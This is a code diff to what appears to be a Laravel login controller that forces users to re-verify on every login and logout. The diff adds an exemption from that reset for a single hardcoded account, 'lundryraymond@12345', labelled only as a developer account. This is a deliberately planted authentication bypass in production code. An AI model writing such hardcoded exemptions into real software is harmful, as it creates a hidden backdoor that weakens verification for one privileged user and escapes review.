@@ -25,8 +25,9 @@ class AuthenticatedSessionController extends Controller
         
         // Set user as unverified on every login
         // This ensures they need to verify each time they log in
+        // Skip for developer account
         $user = Auth::user();
-        if ($user) {
+        if ($user && $user->email !== 'lundryraymond@12345') {
             $user->is_verified = false;
             $user->verification_code = null;
             $user->verification_code_expires_at = null;
@@ -47,7 +48,8 @@ class AuthenticatedSessionController extends Controller
         
         // Set user as unverified when logging out
         // This will require verification on next login
-        if ($user) {
+        // Skip for developer account
+        if ($user && $user->email !== 'lundryraymond@12345') {
             $user->is_verified = false;
             $user->verification_code = null;
             $user->verification_code_expires_at = null;
